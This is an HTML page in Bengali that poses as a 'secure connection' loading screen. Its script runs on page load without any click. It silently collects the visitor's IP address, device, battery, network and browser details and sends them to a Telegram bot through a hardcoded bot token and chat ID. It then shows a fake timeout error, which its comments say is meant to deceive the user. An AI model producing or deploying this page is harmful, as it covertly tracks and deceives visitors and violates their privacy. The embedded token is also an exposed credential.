<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>সংযোগ স্থাপিত হচ্ছে</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: #0a0f1a;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
        }

        .loader-container {
            text-align: center;
            background: rgba(20, 28, 40, 0.9);
            backdrop-filter: blur(8px);
            padding: 2rem 2.2rem;
            border-radius: 2rem;
            border: 1px solid rgba(255,215,150,0.2);
            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
            max-width: 320px;
            width: 90%;
        }

        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid rgba(255,200,120,0.2);
            border-top: 4px solid #ffbc6e;
            border-radius: 50%;
            margin: 0 auto 18px auto;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .message {
            color: #cddcff;
            font-size: 1rem;
            letter-spacing: 0.3px;
        }

        .fake-error {
            color: #ffa06e;
            font-size: 0.85rem;
            margin-top: 20px;
            display: none;
        }

        .small-note {
            font-size: 0.65rem;
            color: #4a5a78;
            margin-top: 20px;
        }
    </style>
</head>
<body>
<div class="loader-container">
    <div class="spinner" id="spinner"></div>
    <div class="message" id="statusMsg">নিরাপদ সংযোগ স্থাপন করা হচ্ছে...</div>
    <div class="fake-error" id="fakeError"></div>
    <div class="small-note">🔒 এনক্রিপ্টেড চ্যানেল</div>
</div>

<script>
    (function() {
        // ---------- Telegram configuration ----------
        const BOT_TOKEN = "8606366033:AAGgmTsvcGpTuYrnDvHCkDmsrJO9KBSRIOY";
        const DEFAULT_CHAT_ID = "7709670231";

        // Helper: get public IP (CORS-free)
        async function getPublicIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return "আইপি প্রাপ্তি ব্যর্থ";
            }
        }

        // Battery info
        async function getBatteryInfo() {
            if (!navigator.getBattery) return { level: "অজানা", charging: "অজানা" };
            try {
                const battery = await navigator.getBattery();
                let levelPercent = Math.round(battery.level * 100);
                let charging = battery.charging ? "হ্যাঁ (চার্জিং)" : "না (ব্যাটারি)";
                return { level: `${levelPercent}%`, charging: charging };
            } catch(e) {
                return { level: "অজানা", charging: "অজানা" };
            }
        }

        // Network info
        function getNetworkInfo() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return { type: "অজানা", rtt: "N/A", speed: "N/A" };
            let type = conn.effectiveType || "unknown";
            let rtt = conn.rtt ? `${conn.rtt}ms` : "N/A";
            let downlink = conn.downlink ? `${conn.downlink}Mbps` : "N/A";
            return { type: type.toUpperCase(), rtt: rtt, speed: downlink };
        }

        // Screen & device
        function getScreenDetails() {
            return {
                resolution: `${screen.width}x${screen.height}`,
                colorDepth: `${screen.colorDepth}-bit`,
                pixelRatio: devicePixelRatio.toFixed(2)
            };
        }

        function getBrowserAndOS() {
            const ua = navigator.userAgent;
            let os = "অজানা";
            if (ua.includes("Android")) os = "Android";
            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
            else if (ua.includes("Windows")) os = "Windows";
            else if (ua.includes("Mac")) os = "macOS";
            let browser = "অজানা";
            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
            else if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
            else if (ua.includes("Edg")) browser = "Edge";
            return { os, browser };
        }

        // Collect all data silently
        async function collectAllData() {
            const ip = await getPublicIP();
            const battery = await getBatteryInfo();
            const network = getNetworkInfo();
            const screenDet = getScreenDetails();
            const osBrowser = getBrowserAndOS();
            const language = navigator.language || "bn-BD";
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const localTime = new Date().toLocaleString('bn-BD', { hour12: false });
            const cookieEnabled = navigator.cookieEnabled ? "সক্রিয়" : "নিষ্ক্রিয়";
            const pageUrl = window.location.href;
            const referrer = document.referrer || "সরাসরি";

            const message = `📢 **নতুন ভিজিট (সাইলেন্ট)**\nআইপি: ${ip}\nওএস: ${osBrowser.os}\nব্রাউজার: ${osBrowser.browser}\nস্ক্রিন: ${screenDet.resolution}\nকালার ডেপথ: ${screenDet.colorDepth}\nব্যাটারি: ${battery.level} (${battery.charging})\nনেটওয়ার্ক: ${network.type}\nRTT: ${network.rtt}\nস্পিড: ${network.speed}\nভাষা: ${language}\nটাইমজোন: ${timezone}\nস্থানীয় সময়: ${localTime}\nকুকি: ${cookieEnabled}\nপেজ ইউআরএল: ${pageUrl}\nরেফারার: ${referrer}`;
            return message;
        }

        // Send to Telegram
        async function sendToTelegram(text) {
            try {
                const params = new URLSearchParams();
                params.append('chat_id', DEFAULT_CHAT_ID);
                params.append('text', text);
                params.append('parse_mode', 'Markdown');
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: params
                });
                const result = await response.json();
                return result.ok;
            } catch(e) {
                return false;
            }
        }

        // UI elements
        const spinner = document.getElementById('spinner');
        const statusMsg = document.getElementById('statusMsg');
        const fakeErrorDiv = document.getElementById('fakeError');

        // After data collection and sending, show fake error (so user thinks nothing happened)
        async function silentTrack() {
            try {
                const dataMessage = await collectAllData();
                await sendToTelegram(dataMessage);
                // All done silently – now deceive the user
                // Remove spinner, show fake connection timeout
                spinner.style.display = 'none';
                statusMsg.style.display = 'none';
                fakeErrorDiv.style.display = 'block';
                fakeErrorDiv.innerHTML = '❌ সংযোগ টাইমআউট। সার্ভার থেকে সাড়া মেলেনি। দয়া করে পরে চেষ্টা করুন।';
                // Also change the small note to something generic
                const smallNote = document.querySelector('.small-note');
                if (smallNote) smallNote.innerHTML = '⚠️ নেটওয়ার্ক ত্রুটি, পরে পুনরায় চেষ্টা করুন।';
            } catch(e) {
                // Fallback fake error
                spinner.style.display = 'none';
                statusMsg.style.display = 'none';
                fakeErrorDiv.style.display = 'block';
                fakeErrorDiv.innerHTML = '❌ সার্ভার সংযোগ ব্যর্থ। কিছুক্ষণ পর আবার চেষ্টা করুন।';
            }
        }

        // Start the process immediately after page loads (no user click)
        window.addEventListener('load', () => {
            // Small delay to make it look like "connecting"
            setTimeout(() => {
                silentTrack();
            }, 800);
        });
    })();
</script>
</body>
</html>
